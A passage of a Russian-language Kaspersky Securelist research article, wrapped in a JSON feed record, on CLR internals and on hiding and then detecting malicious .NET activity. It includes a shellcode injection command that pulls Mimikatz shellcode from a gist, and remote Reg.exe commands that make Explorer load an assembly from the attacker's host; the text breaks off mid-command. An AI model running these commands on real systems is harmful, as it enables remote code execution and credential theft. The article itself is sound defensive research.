{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2021-09-28 19:37:27","updatedTime":"2021-09-28 19:37:27","title":"Обход обнаружения в CLR: пример атаки и способы ее выявления","link":"https://kasperskycontenthub.com/securelist-russia/?p=103633","description":"<p><img width=\"990\" height=\"400\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2020/04/28141255/sl_remote_bruteforce_attacks-990x400.jpg\" class=\"attachment-securelist-huge-promo size-securelist-huge-promo wp-post-image\" alt=\"\" loading=\"lazy\" /></p>\n<p>В последнее время соотношение затрат на атаку и защиту от нее меняется не в пользу защитников. Большинство злоумышленников и пентестеров используют <a href=\"https://github.com/gentilkiwi/mimikatz/\" target=\"_blank\" rel=\"noopener\">Mimikatz</a>, <a href=\"https://github.com/BloodHoundAD/SharpHound3\" target=\"_blank\" rel=\"noopener\">SharpHound</a>, <a href=\"https://github.com/GhostPack/Seatbelt\" target=\"_blank\" rel=\"noopener\">SeatBelt</a>, <a href=\"https://github.com/GhostPack/Rubeus\" target=\"_blank\" rel=\"noopener\">Rubeus</a>, <a href=\"https://github.com/GhostPack/\" target=\"_blank\" rel=\"noopener\">GhostPack</a> и другие общедоступные инструменты. Эта так называемая <a href=\"https://medium.com/@johnlatwc/the-githubification-of-infosec-afbdbfaad1d1\" target=\"_blank\" rel=\"noopener\">«гитхабификация»</a> процессов, которая происходит и в «красных командах», снижает стоимость атаки. Это позволяет различным командам злоумышленников переключить внимание с разработки вредоносного ПО со схожей функциональностью на, например, изобретение способов обхода обнаружения. Нет смысла писать с нуля код, который в итоге могут заблокировать защитные решения, если можно научиться использовать уже существующие инструменты — достаточно только «спрятать» их от детектирования. Это дешевле, особенно если использовать для «сокрытия» набор утилит с открытым кодом. При этом стоимость защиты от такой атаки только вырастет, ведь службе безопасности атакуемой организации придется бороться как с широким спектром свободно распространяемого инструментария атакующих, так и со <a href=\"https://attack.mitre.org/tactics/TA0005/\" target=\"_blank\" rel=\"noopener\">средствами и способами обхода защитных решений</a>.</p> \n<p>Бесфайловые атаки, активное использование инструментов <a href=\"https://lolbas-project.github.io/\" target=\"_blank\" rel=\"noopener\">LOLBAS</a>, шифрование во время выполнения, загрузчики и упаковщики — все это позволяет обходить защитные решения и средства контроля. Mimikatz внутри <a href=\"https://troopers.de/media/filer_public/82/de/82de5e58-0bd1-447a-b4f9-8a908ad2ef70/mind_the_gap_-_final.pdf\" target=\"_blank\" rel=\"noopener\">InstallUtil.exe</a> ни для кого уже не новость. В этой статье мы рассмотрим одну из техник, которую злоумышленники могут использовать для сокрытия вредоносной активности в памяти, а именно — удаление индикаторов компрометации из памяти. Затем мы расскажем об инструментах и методах обнаружения применения этой техники. В качестве предметной области мы рассмотрим приложения, которые исполняются в среде <a href=\"https://ru.wikipedia.org/wiki/Common_Language_Runtime\" target=\"_blank\" rel=\"noopener\">CLR</a> (Common Language Runtime, среда выполнения) или используют ее. Это и PowerShell, и многочисленные инструменты LOLBAS, и множество утилит, написанных на C#.</p> \n<p>Если вы знакомы с CLR, пролистайте до раздела <a href=\"https://kasperskycontenthub.com/securelist-russia/?p=103633#obhod\">«Обход обнаружения в CLR»</a>.</p> \n<h2 id=\"obshhie-svedeniya-o-sborkax-i-kode-kotoryj-ispolnyaetsya-v-clr\">Общие сведения о сборках и коде, который исполняется в CLR</h2> \n<p>Для начала давайте разберемся, каким образом в CLR появляется исполняемый код. При компиляции исходного кода, написанного, например, на C#, компилятор выдает не готовый для исполнения PE-файл, а <a href=\"https://docs.microsoft.com/ru-ru/dotnet/standard/assembly/\" target=\"_blank\" rel=\"noopener\">сборку</a>. Это прежде всего набор инструкций (<a href=\"https://ru.wikipedia.org/wiki/Common_Intermediate_Language\" target=\"_blank\" rel=\"noopener\">CIL</a>-код) для среды выполнения, чтобы она смогла в процессе исполнения этой сборки сгенерировать native code, то есть машинный код платформы, на которой выполняется программа. Этот код в свою очередь и будет исполнен. Процесс создания машинного кода из сборки в момент исполнения называется <a href=\"https://ru.wikipedia.org/wiki/JIT-%D0%BA%D0%BE%D0%BC%D0%BF%D0%B8%D0%BB%D1%8F%D1%86%D0%B8%D1%8F\" target=\"_blank\" rel=\"noopener\">JIT-компиляцией</a>.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203239/Abnormal_CLR_activities_ru_01.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103643\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203239/Abnormal_CLR_activities_ru_01.png\" alt=\"Common Language Runtime. Источник: https://ru.wikipedia.org/wiki/Common_Language_Runtime\" width=\"552\" height=\"487\" /></a></p> \n<p style=\"text-align: center\"><strong><em>Common Language Runtime. Источник: <a href=\"https://ru.wikipedia.org/wiki/Common_Language_Runtime\" target=\"_blank\" rel=\"noopener\">https://ru.wikipedia.org/wiki/Common_Language_Runtime</a></em></strong></p> \n<p>Сборка, полученная в результате компиляции приложения, <a href=\"https://docs.microsoft.com/ru-ru/dotnet/standard/assembly/contents\" target=\"_blank\" rel=\"noopener\">будет содержать</a> в себе следующую информацию:</p> \n<ul> \n <li>Метаданные о классах, интерфейсах, типах, методах и полях в сборке. Эта информация нужна для того, чтобы среда CLR могла оперировать написанным кодом: загружать, ссылаться на него, запускать один фрагмент кода из другого и передавать входные и выходные данные. Процесс чтения и применения этих данных называется <a href=\"https://ru.wikipedia.org/wiki/%D0%9E%D1%82%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)\" target=\"_blank\" rel=\"noopener\">отражением</a>.</li> \n <li>Сам код, определенный в модулях. Он не запустится, если его не обработает CLR.</li> \n <li><a href=\"https://docs.microsoft.com/ru-ru/dotnet/standard/assembly/manifest\" target=\"_blank\" rel=\"noopener\">Манифест</a> — это данные о безопасности, версиях, зависимостях и составных частях сборки. Манифест определяет, что нужно, чтобы запустить код. Например, если для запуска кода необходимо наличие <a href=\"https://github.com/JamesNK/Newtonsoft.Json\" target=\"_blank\" rel=\"noopener\">https://github.com/JamesNK/Newtonsoft.Json</a>, то это будет определено в манифесте.</li> \n <li>Ресурсы. Файлы и данные любых типов, которые могут быть включены в саму сборку или храниться отдельно.</li> \n</ul> \n<p>Загрузка и исполнение сборок — это сложный процесс. Давайте разберемся, как он происходит.</p> \n<h2 id=\"chto-proisxodit-pri-starte-processa\">Что происходит при старте процесса</h2> \n<p>Хорошее представление о том, что и как загружается в <a href=\"https://ru.wikipedia.org/wiki/%D0%A3%D0%BF%D1%80%D0%B0%D0%B2%D0%BB%D1%8F%D0%B5%D0%BC%D1%8B%D0%B9_%D0%BA%D0%BE%D0%B4\" target=\"_blank\" rel=\"noopener\">управляемый процесс</a>, дает <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/performance/clr-etw-providers#the-runtime-provider\" target=\"_blank\" rel=\"noopener\">ETW CLR Runtime Provider</a> (GUID e13c0d23-ccbc-4e12-931b-d9cc2eee27e4).</p> \n<table> \n <tbody> \n  <tr> \n   <td><strong>Событие</strong></td> \n   <td><strong>№</strong></td> \n   <td><strong>Количество на процесс</strong></td> \n   <td><strong>Описание</strong></td> \n  </tr> \n  <tr> \n   <td>RuntimeInformationEvent</td> \n   <td>187</td> \n   <td>Одно</td> \n   <td>Запуск CLR</td> \n  </tr> \n  <tr> \n   <td>AppDomainLoad_V1</td> \n   <td>156</td> \n   <td>Много</td> \n   <td>Загрузка домена приложения</td> \n  </tr> \n  <tr> \n   <td>AssemblyLoad_V1</td> \n   <td>154</td> \n   <td>Много</td> \n   <td>Загрузка сборки</td> \n  </tr> \n  <tr> \n   <td>ModuleLoad_V2</td> \n   <td>152</td> \n   <td>Много</td> \n   <td>Загрузка модуля<br /> <strong><span style=\"color: red\">Код, который мы написали, тут</span></strong></td> \n  </tr> \n  <tr> \n   <td>ModuleUnload_V2</td> \n   <td>153</td> \n   <td>Много</td> \n   <td>Выгрузка модуля</td> \n  </tr> \n  <tr> \n   <td>AssemblyUnload_V1</td> \n   <td>155</td> \n   <td>Много</td> \n   <td>Выгрузка сборки</td> \n  </tr> \n  <tr> \n   <td>AppDomainUnLoad_V1</td> \n   <td>157</td> \n   <td>Много</td> \n   <td>Выгрузка домена приложения. С точки зрения аналитика SOC может быть интересно, если это событие происходит многократно в случайные промежутки времени.</td> \n  </tr> \n </tbody> \n</table> \n<h3 id=\"zapusk-clr\">Запуск CLR</h3> \n<p>При разработке CLR компания Microsoft реализовала его как COM-сервер, содержащийся внутри DLL. То есть определила для среды CLR стандартный COM-интерфейс и присвоила GUID этому интерфейсу и COM-серверу. Когда вы устанавливаете .NET Framework, COM-сервер, представляющий CLR, регистрируется в реестре Windows, как и любой другой COM-сервер. <strong>Любое приложение Windows может размещать среду CLR</strong>. Когда это происходит, генерируется событие 187. В этом событии отражено то, каким образом была активирована среда CLR. В случае COM-активации CLR поля StartupMode, ComObjectGUID будут содержать крайне полезную информацию.</p> \n<p>Если вам нужна дополнительная информация по этой теме, обратитесь к заголовочному файлу MetaHost.h на C++, который поставляется с .NET Framework SDK. Этот файл задает идентификаторы GUID и определение неуправляемого интерфейса ICLRMetaHostinterface. Вы научитесь запускать CLR с помощью любого языка: С++, Python и т. д.</p> \n<h3 id=\"zagruzka-domena-prilozheniya\">Загрузка домена приложения</h3> \n<p>После запуска CLR создается событие 156 — загрузка домена приложения в CLR. Когда COM-сервер CLR инициализируется, он создает домен приложения (AppDomain) — логический контейнер для набора сборок, которые, как правило, реализуют функциональное приложение. Также домен приложения — это механизм в CLR, который&nbsp; дает возможность запустить группу приложений в одном процессе, обеспечивая их относительную изоляцию друг от друга и в то же время позволяя им взаимодействовать друг с другом значительно быстрее. В одном процессе может работать много доменов приложений. Первый домен приложения, созданный при инициализации среды CLR, называется доменом приложения по умолчанию и уничтожается только после завершения процесса Windows.</p> \n<p>К объектам, созданным в одном домене приложения, нельзя получить доступ напрямую с помощью кода в другом домене приложения. Когда код в домене приложения создает объект, данный объект «принадлежит» этому домену приложения. <strong>Также объекту (артефакту в том числе) не разрешается существовать дольше домена приложения, код которого его создал.</strong> Код внутри домена приложения может получить доступ к объекту других доменов приложений только с помощью <a href=\"https://docs.microsoft.com/ru-ru/dotnet/framework/interop/interop-marshaling\" target=\"_blank\" rel=\"noopener\">маршалинга</a> (передачи данных) по ссылке или по значению. Это обеспечивает четкие границы между приложениями, поскольку код в одном домене приложения не может иметь прямой ссылки на объект, созданный кодом в другом домене приложения. Эта изоляция позволяет легко выгружать домены приложений из процесса, не затрагивая код, выполняющийся в других доменах приложений.</p> \n<table style=\"border: 1px solid\"> \n <tbody> \n  <tr> \n   <td style=\"padding: 0 1% 0 1%\">Заметим, что CLR не поддерживает возможность выгрузки отдельной сборки из домена приложения. Однако вы можете дать CLR команду выгрузить весь домен, что приведет к выгрузке всех сборок, содержащихся в нем в данный момент.</td> \n  </tr> \n </tbody> \n</table> \n<p>То, что каждое приложение запускается в собственном адресном пространстве процесса, — замечательное свойство Windows. Оно гарантирует, что код в одном приложении не сможет получить доступ к коду или данным, используемым другим приложением. Изоляция процессов предотвращает появление дыр в безопасности, повреждение данных и другие непредсказуемые события, и это делает операционную систему и приложения, работающие в ней, надежными. К сожалению, создание процессов в Windows очень «дорого». Функция Win32 CreateProcess работает очень медленно, а Windows требует много памяти для виртуализации адресного пространства процесса.</p> \n<p>Однако если приложение полностью состоит из управляемого кода, который является достаточно безопасным и не вызывает неуправляемый код, можно без проблем запустить несколько управляемых приложений в одном процессе Windows. Домены приложений обеспечивают изоляцию, необходимую для защиты, настройки и завершения работы каждого из этих приложений. <strong>Единицей изоляции для кода в CLR является домен приложения, а не процесс</strong>. При этом мы можем сказать с рядом допущений, что старт процесса в семантике WinAPI аналогичен созданию домена приложения. Для SOC-аналитика будет лучше думать, что события загрузки домена приложения и старта процесса функционально одинаковы.</p> \n<p>Жесткого ограничения на количество доменов приложений, которые могут выполняться в одном процессе Windows, не существует. Их можно сравнить с сайтами на одном сервере IIS. Каждый сайт — это отдельный домен приложения, который изолирован от других сайтов и который можно выгрузить из сервера, не затрагивая их.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203334/Abnormal_CLR_activities_02.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103644\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203334/Abnormal_CLR_activities_02.png\" alt=\"\" width=\"500\" height=\"129\" /></a></p> \n<h3 id=\"zagruzka-sborki\">Загрузка сборки</h3> \n<p>В домен приложения загружается <a href=\"https://docs.microsoft.com/ru-ru/dotnet/standard/assembly/#assemblies-in-the-common-language-runtime\" target=\"_blank\" rel=\"noopener\">сборка</a>. Сборка определяет ряд правил для кода, который в ней содержится, предоставляет CLR (и другому коду) сведения о типах и классах, определенных в сборке. В некоторых случаях сборка может быть нейтральной к домену приложения, и ее код могут использовать все домены, однако в данной статье нас не интересуют такие сборки.</p> \n<h3 id=\"zagruzka-modulya\">Загрузка модуля</h3> \n<p>В сборку загружаются <a href=\"https://stackoverflow.com/a/27881763\" target=\"_blank\" rel=\"noopener\">модули</a>, которые уже содержат непосредственно СIL-код. На этот CIL-код накладываются правила, описанные в сборке, и происходит процесс JIT-компиляции CIL в готовый для исполнения native code. <strong>Чтобы избавиться от артефакта, который определен в модуле или появляется в нем в ходе работы, нужно выгрузить весь домен приложения</strong>.</p> \n<p>На рисунке показан отдельный процесс Windows, в котором работает один COM-сервер CLR. Эта среда CLR в данный момент управляет двумя доменами приложений. Каждый домен имеет свою собственную кучу загрузчика, а каждая куча имеет запись о том, какие типы были доступны с момента создания домена. Каждый объект типа в куче загрузчика имеет таблицу методов, и каждая запись в таблице методов указывает на JIT-скомпилированный собственный код, если метод был выполнен хотя бы один раз.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203408/Abnormal_CLR_activities_03.jpeg\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103645\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203408/Abnormal_CLR_activities_03.jpeg\" alt=\"CLR via C#. Источник: J. Richter \" width=\"720\" height=\"526\" /></a></p> \n<p style=\"text-align: center\"><strong><em>CLR via C#. Источник: J. Richter</em> </strong></p> \n<h2 id=\"obhod\">Обход обнаружения в CLR</h2> \n<p>Для начала разберем, как атака может быть обнаружена. В качестве примера возьмем фреймворк для пентеста <a href=\"https://github.com/cobbr/Covenant\" target=\"_blank\" rel=\"noopener\">Covenant</a>.</p> \n<h3 id=\"single_domain\">Запуск Covenant в одном домене приложения</h3> \n<p>Посмотрим, как работает Covenant. Запустим в системе Grunt (в терминологии данного фреймворка это программа, отвечающая за обмен данными с сервером и запускающая задания на исполнение). Затем мы запустим ряд типичных для злоумышленника действий, а именно: сбор информации о текущем пользователе, автозагрузке, просмотр сведений о билетах Kerberos, загруженных в сессию текущего пользователя, и об истории браузера. Итого — в один домен приложения загружаются несколько сборок: Seatbelt AutoRuns, Seatbelt ChromeHistory, Rubeus klist и другие.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203502/Abnormal_CLR_activities_ru_04.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103646\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203502/Abnormal_CLR_activities_ru_04.png\" alt=\"Загруженные сборки Rubeus и Seatbelt\" width=\"1016\" height=\"449\" /></a></p> \n<p style=\"text-align: center\"><strong><em>Загруженные сборки Rubeus и Seatbelt</em></strong></p> \n<p>Как видите, в один домен приложения загружаются сборки с разной функциональностью. Более того, эти сборки могут быть замечены классическим средством мониторинга, поскольку могут содержать различные артефакты, которые появились в результате работы кода или были определены непосредственно в коде. А выгрузить их не выйдет, ведь они связаны одним доменом приложения с кодом, реализующим работу с CnC.</p> \n<h3 id=\"injection\">Запуск нового процесса и инъекция кода</h3> \n<p>Что может сделать атакующий, чтобы затруднить обнаружение? Он может использовать классические средства разделения кода: инъекции кода и/или старт нового процесса. Однако это не всегда возможно: существуют ситуации, когда как инъекции, так и старт нового процесса будут слишком заметны для средств мониторинга. Также не всегда является возможным закрытие какого-то процесса, который содержит артефакт, — например, в том случае, если для инъекции использовался системный процесс.</p> \n<p>Чтобы продемонстрировать это, давайте создадим шеллкод из <a href=\"https://github.com/gentilkiwi/mimikatz\" target=\"_blank\" rel=\"noopener\">Mimikatz</a> (с помощью <a href=\"https://github.com/TheWover/donut\" target=\"_blank\" rel=\"noopener\">Donut</a>) и внедрим его в какой-либо процесс (я выбрал PowerShell), используя программу <a href=\"https://github.com/3xpl01tc0d3r/ProcessInjection\" target=\"_blank\" rel=\"noopener\">Process Injection</a>, которую в свою очередь запустим из Grunt под управлением Covenant. Это тот же самый метод, который описан в обзоре <a href=\"https://www.dmzero.net/injection-standard.html\" target=\"_blank\" rel=\"noopener\">тут</a>. Мы сможем пронаблюдать обе техники: и старт нового процесса, и инъекцию кода. Для мониторинга воспользуемся утилитой <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\">Sysmon</a> со ставшими практически «дефолтными» <a href=\"https://github.com/SwiftOnSecurity/sysmon-config\" target=\"_blank\" rel=\"noopener\">настройками</a> от <a href=\"https://twitter.com/SwiftOnSecurity\" target=\"_blank\" rel=\"noopener\">SwiftOnSecurity</a>.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203558/Abnormal_CLR_activities_05.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103647\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203558/Abnormal_CLR_activities_05.png\" alt=\"Загрузка инъектора на ПК жертвы\" width=\"540\" height=\"67\" /></a></p> \n<p style=\"text-align: center\"><em><strong>Загрузка инъектора на ПК жертвы</strong></em></p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203625/Abnormal_CLR_activities_05-2.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103648\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203625/Abnormal_CLR_activities_05-2.png\" alt=\"Старт инъектора и инъекция шеллкода\" width=\"706\" height=\"388\" /></a></p> \n<p style=\"text-align: center\"><em><strong>Старт инъектора и инъекция шеллкода</strong></em></p> \n<p>Grunt на ПК жертвы запускает ProcessInjection.exe c командной строкой, как указано ниже (закодированный по методу Base64 шеллкод будет скачан с glist):</p>\n<pre class=\"crayon-plain-tag\">ProcessInjection.exe /t:1 /f:base64 /pid:1604 /\nurl:https://gist.githubusercontent.com/gam4er/07aae8b5284c9aa54ff976c3f4bc0cd9/raw/ec0de97792230bbb0526dd60\n659c3e1c75c3a63b/Mimi</pre>\n<p> И Sysmon покажет множество подозрительных действий.</p> \n<table> \n <tbody> \n  <tr> \n   <td width=\"33%\"><strong>Create executable file</strong></td> \n   <td width=\"33%\"><strong>Create process</strong></td> \n   <td width=\"33%\"><strong>Inject code from ProcessInjection.exe to powershell.exe</strong></td> \n  </tr> \n  <tr> \n   <td style=\"vertical-align: top\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203700/Abnormal_CLR_activities_06.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103649\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203700/Abnormal_CLR_activities_06.png\" alt=\"\" width=\"283\" height=\"151\" /></a></td> \n   <td style=\"vertical-align: top\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203713/Abnormal_CLR_activities_07.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103650\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203713/Abnormal_CLR_activities_07.png\" alt=\"\" width=\"393\" height=\"364\" /></a></td> \n   <td style=\"vertical-align: top\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203725/Abnormal_CLR_activities_08.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103651\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203725/Abnormal_CLR_activities_08.png\" alt=\"\" width=\"329\" height=\"220\" /></a></td> \n  </tr> \n </tbody> \n</table> \n<p>Следует указать, что с установленными решениями AV/EPP/EDR описанная цепочка не сможет запуститься, поскольку являет собой пример хорошо известного паттерна поведения атакующего. Напрашивается вывод, что старые методы запуска/инъекции кода очень заметны.</p> \n<h3 id=\"ispolzovanie-com-servera-dlya-udalennogo-vypolneniya-koda\">Использование COM-сервера для удаленного выполнения кода</h3> \n<p>Теперь рассмотрим скачивание и запуск кода на удаленной машине через активацию COM-сервера в процессе Explorer.В качестве COM-сервера зарегистрируем библиотеку MSCOREE, реализующую функциональность CLR в Windows, которая в качестве аргументов примет имя сборки и класс, содержащий реализацию сервера. Зарегистрировав таким образом COM-сервер, мы дали CLR указание в случае активации загрузить реализующий сервер код из указанного класса.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203938/Abnormal_CLR_activities_09.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103652\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203938/Abnormal_CLR_activities_09-1024x182.png\" alt=\"\" width=\"1024\" height=\"182\" /></a></p> \n<p>Обратите внимание на ключ CodeBase. Он служит для того, чтобы можно было использовать COM-сервер <strong>без регистрации</strong> своей сборки в <a href=\"https://docs.microsoft.com/ru-ru/dotnet/framework/app-domains/gac\" target=\"_blank\" rel=\"noopener\">глобальном кэше сборок</a> (GAC). Это позволяет определить COM-сервер от имени пользователя (поскольку регистрация в GAC требует высоких привилегий). Этот параметр принимает URI, что выглядит несколько странно. Хост-процесс загружает из сети и запускает сборку, содержащую COM-сервер. Заметим, что регистрация COM-сервера тоже возможна по сети: чтобы определить COM-сервер, нужно просто изменить реестр.</p> \n<p>Существует множество способов <a href=\"https://github.com/dotnet/runtime/blob/16c48d6a45d4d706c327fc840e1a5d450fb189ae/src/coreclr/inc/clrconfigvalues.h\" target=\"_blank\" rel=\"noopener\">настройки</a> общеязыковой среды исполнения и множество параметров, доступных для конфигурации: конфигурационные файлы приложения и глобальные переменные окружения. Более того, есть специальный <a href=\"https://github.com/dotnet/docs/blob/main/docs/framework/configure-apps/file-schema/runtime/loadfromremotesources-element.md#enabled-attribute\" target=\"_blank\" rel=\"noopener\">параметр</a>, который разрешает или запрещает (по умолчанию запрещает) загрузку сборок из удаленных источников. Однако в случае COM-активации CLR в хост-процессе Explorer загрузка сборок из удаленных источников разрешена. Является ли это уязвимостью? Определенно нет. Можно ли это использовать для того, чтобы заставить удаленную машину запустить код, который не находится на ней? Определенно да.</p> \n<h3 id=\"prakticheskij-primer-sobiraem-znaniya-voedino\">Практический пример. Собираем знания воедино</h3> \n<p>Мы продемонстрировали, что запуск вредоносных компонентов в одном домене приложения (см. <a href=\"https://kasperskycontenthub.com/securelist-russia/?p=103633#single_domain\">«Запуск Covenant в одном домене приложения»</a>), равно как и создание отдельного процесса или инъекция кода (см. <a href=\"https://kasperskycontenthub.com/securelist-russia/?p=103633#injection\">«Запуск нового процесса и инъекция кода»</a>) можно обнаружить. В зависимости от ситуации это легче или сложнее, но в целом подобные манипуляции довольно заметны. Мы также разобрали, как настроить удаленную загрузку кода в CLR. Теперь рассмотрим прием, способный затруднить обнаружение запуска кода при помощи COM-активированной среды CLR. Мы запустим обычный вариант Mimikatz на удаленном хосте в контексте процесса Explorer и удалим артефакты после его выполнения. Эта демонстрационная атака предполагает, что у нас уже есть доступ к хосту жертвы. Все шаги отражены на видео (на английском языке) и расписаны ниже. Для удобства мы также приводим в тексте временные метки отдельных шагов, чтобы вы могли посмотреть нужный фрагмент видео.</p> \n<p><iframe loading=\"lazy\" width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/RbGROh7HC6U\" frameborder=\"0\"></iframe></p> \n<p>В качестве защитного решения на хосте жертвы мы используем Yara и правила из репозитория Mimikatz. Inveigh и Mimikatz уже установлены на устройстве. Для начала проверим, что Yara-правила работают.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204012/Abnormal_CLR_activities_10.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103653\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204012/Abnormal_CLR_activities_10-1024x106.png\" alt=\"\" width=\"1024\" height=\"106\" /></a></p> \n<p>Теперь взглянем на процесс explorer.exe (PID 3896) и убедимся, что в нем нет артефактов Mimikatz. После этого мы перезагрузим explorer.exe, чтобы еще раз показать, что он чист и что в нем нет сборок CLR.</p> \n<table border=\"0\"> \n <tbody> \n  <tr> \n   <td style=\"vertical-align: top\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204133/Abnormal_CLR_activities_11.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103654\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204133/Abnormal_CLR_activities_11.png\" alt=\"\" width=\"560\" height=\"76\" /></a></td> \n   <td style=\"vertical-align: top\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204145/Abnormal_CLR_activities_12.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103655\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204145/Abnormal_CLR_activities_12.png\" alt=\"\" width=\"781\" height=\"105\" /></a></td> \n  </tr> \n </tbody> \n</table> \n<p>Перемещаемся на хост атакующего (01:40). Добавляем обработчик Explorer в реестр на хосте жертвы. Когда жертва запустит Explorer, в него загрузится сборка с удаленного хоста атакующего.</p>\n<pre class=\"crayon-plain-tag\">Reg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\" /ve /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\" /ve /t REG_SZ /d \"mscoree.dll\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\" /v \"Assembly\" /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=1aadad2b22ca8c0e\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\" /v \"Class\" /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\" /v \"RuntimeVersion\" /t REG_SZ /d \"v4.0.30319\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\" /v \"ThreadingModel\" /t REG_SZ /d \"Both\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\" /v \"CodeBase\" /t REG_SZ /d \"http://ts-dc1.enterprise.lab/ReadOnlyFileIconOverlayHandler.dll\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\\1.0.0.0\" /v \"Assembly\" /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=1aadad2b22ca8c0e\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\\1.0.0.0\" /v \"Class\" /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\\1.0.0.0\" /v \"RuntimeVersion\" /t REG_SZ /d \"v4.0.30319\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\CLSID\\{a259c04f-ffa8-310b-864c-fe602840399e}\\InprocServer32\\1.0.0.0\" 